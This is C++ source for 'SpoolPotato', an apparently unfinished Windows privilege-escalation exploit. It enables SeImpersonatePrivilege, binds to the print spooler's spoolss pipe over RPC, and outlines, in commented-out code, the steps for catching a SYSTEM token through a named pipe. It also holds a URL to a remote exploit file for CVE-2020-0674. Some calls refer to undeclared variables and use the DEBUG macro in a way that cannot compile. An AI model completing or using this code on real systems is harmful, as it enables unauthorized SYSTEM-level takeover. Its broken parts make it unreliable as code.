#include <iostream>
#include <Windows.h>
#include <strsafe.h>
#include <sddl.h>
#include <userenv.h>
#include <wtsapi32.h>
#include "IWinSpool_h.h"

#pragma comment(lib, "Wtsapi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#pragma comment(lib, "userenv.lib")
#pragma warning(disable: 28251)

////////
////////
// Global settings
////////

#define DEBUG
#define EXE_BUILD
//#define DLL_BUILD
//#define SHELLCODE_BUILD
#define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"

////////
////////
// Debug logic
////////

#ifdef DEBUG
void DebugLog(const wchar_t* Format, ...) {
    va_list Args;
    wchar_t* pBuffer = (wchar_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10000 * 2);
    va_start(Args, Format);
    wvsprintf(pBuffer, Format, Args);
    va_end(Args);
#ifdef DLL_BUILD
	DWORD messageAnswer{};
	WTSSendMessageW(WTS_CURRENT_SERVER_HANDLE, g_dwSessionId, (wchar_t*)L"", 0, Buf, (wcslen(Buf) + 1) * 2, 0, 0, &messageAnswer, true);
    MessageBoxW(0, pBuffer, L"SpoolPotato", 0);
#endif
#ifdef EXE_BUILD
    printf("%ws\r\n", pBuffer);
#endif
    HeapFree(GetProcessHeap(), 0, pBuffer);
}
#endif

////////
////////
// RPC helpers
////////

handle_t __RPC_USER STRING_HANDLE_bind(STRING_HANDLE lpStr)
{
	RPC_STATUS RpcStatus;
	RPC_WSTR StringBinding;
	handle_t BindingHandle;

	if (RpcStringBindingComposeW((RPC_WSTR)L"12345678-1234-ABCD-EF00-0123456789AB", (RPC_WSTR)L"ncacn_np", (RPC_WSTR)lpStr, (RPC_WSTR)L"\\pipe\\spoolss", NULL, &StringBinding) != RPC_S_OK)
		return NULL;

	RpcStatus = RpcBindingFromStringBindingW(StringBinding, &BindingHandle);

	RpcStringFreeW(&StringBinding);

	if (RpcStatus != RPC_S_OK)
		return NULL;

	return BindingHandle;
}

void __RPC_USER STRING_HANDLE_unbind(STRING_HANDLE lpStr, handle_t BindingHandle)
{
	RpcBindingFree(&BindingHandle);
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
	return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
	free(p);
}

////////
////////
// Privilege/token manipulation logic
////////

BOOL EnablePrivilege(const wchar_t *PrivilegeName) {
	BOOL bResult = FALSE;
	HANDLE hToken = INVALID_HANDLE_VALUE;
	DWORD dwTokenPrivilegesSize = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	LPWSTR pwszPrivilegeName = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		if (!GetTokenInformation(hToken, TokenPrivileges, NULL, dwTokenPrivilegesSize, &dwTokenPrivilegesSize))
		{
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			{
				DEBUG(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
				goto cleanup;
			}
		}

		pTokenPrivileges = (PTOKEN_PRIVILEGES)malloc(dwTokenPrivilegesSize);
		if (!pTokenPrivileges)
			goto cleanup;

		if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenPrivilegesSize, &dwTokenPrivilegesSize))
		{
			DEBUG(L"GetTokenInformation() failed. Error: %d\n", GetLastError());
			goto cleanup;
		}

		for (DWORD i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
		{
			LUID_AND_ATTRIBUTES laa = pTokenPrivileges->Privileges[i];
			DWORD dwPrivilegeNameLength = 0;

			if (!LookupPrivilegeNameW(NULL, &(laa.Luid), NULL, &dwPrivilegeNameLength))
			{
				if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
				{
					DEBUG(L"LookupPrivilegeName() failed. Error: %d\n", GetLastError());
					goto cleanup;
				}
			}

			dwPrivilegeNameLength++;
			pwszPrivilegeName = (LPWSTR)malloc(dwPrivilegeNameLength * sizeof(WCHAR));
			if (!pwszPrivilegeName)
				goto cleanup;

			if (!LookupPrivilegeNameW(NULL, &(laa.Luid), pwszPrivilegeName, &dwPrivilegeNameLength))
			{
				DEBUG(L"LookupPrivilegeName() failed. Error: %d\n", GetLastError());
				goto cleanup;
			}

			if (!_wcsicmp(pwszPrivilegeName, PrivilegeName))
			{
				TOKEN_PRIVILEGES tp = { 0 };

				ZeroMemory(&tp, sizeof(TOKEN_PRIVILEGES));
				tp.PrivilegeCount = 1;
				tp.Privileges[0].Luid = laa.Luid;
				tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
				{
					DEBUG(L"AdjustTokenPrivileges() failed. Error: %d\n", GetLastError());
					goto cleanup;
				}

				bResult = TRUE;
			}

			free(pwszPrivilegeName);

			if (bResult)
				break;
		}

	cleanup:
		if (hToken)
			CloseHandle(hToken);
		if (pTokenPrivileges)
			free(pTokenPrivileges);
	}

	return bResult;
}

DWORD SpoolPotato()
{
	LPWSTR pwszPipeName = NULL;
	HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
	HANDLE hSpoolPipeEvent = INVALID_HANDLE_VALUE;
	HANDLE hSpoolTriggerThread = INVALID_HANDLE_VALUE;
	DWORD dwWait = 0;

	if (!EnablePrivilege(SE_IMPERSONATE_NAME))
	{
		DEBUG(L"[-] A privilege is missing: '%ws'\n", SE_IMPERSONATE_NAME);
		goto cleanup;
	}

	DEBUG(L"[+] Found privilege: %ws\n", SE_IMPERSONATE_NAME);
	/*
	if (!GenerateRandomPipeName(&pwszPipeName))
	{
		DEBUG(L"[-] Failed to generate a name for the pipe.\n");
		goto cleanup;
	}

	DEBUG(L"Successfully generated random pipe name: %ws\r\n", pwszPipeName);

	if (!(hSpoolPipe = CreateSpoolNamedPipe(pwszPipeName)))
	{
		DEBUG(L"[-] Failed to create a named pipe.\n");
		goto cleanup;
	}

	DEBUG(L"Successfully created named pipe");

	if (!(hSpoolPipeEvent = ConnectSpoolNamedPipe(hSpoolPipe)))
	{
		DEBUG(L"[-] Failed to connect the named pipe.\n");
		goto cleanup;
	}

	DEBUG(L"[+] Named pipe listening...\n");

	if (!(hSpoolTriggerThread = TriggerNamedPipeConnection(pwszPipeName)))
	{
		DEBUG(L"[-] Failed to trigger the Spooler service.\n");
		goto cleanup;
	}

	dwWait = WaitForSingleObject(hSpoolPipeEvent, 5000);
	if (dwWait != WAIT_OBJECT_0)
	{
		DEBUG(L"[-] Operation failed or timed out.\n");
		goto cleanup;
	}

	GetSystem(hSpoolPipe);
	*/
cleanup:
	if (hSpoolPipe)
		CloseHandle(hSpoolPipe);
	if (hSpoolPipeEvent)
		CloseHandle(hSpoolPipeEvent);
	if (hSpoolTriggerThread)
		CloseHandle(hSpoolTriggerThread);

	return 0;
}

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
	SpoolPotato();
    return 0;
}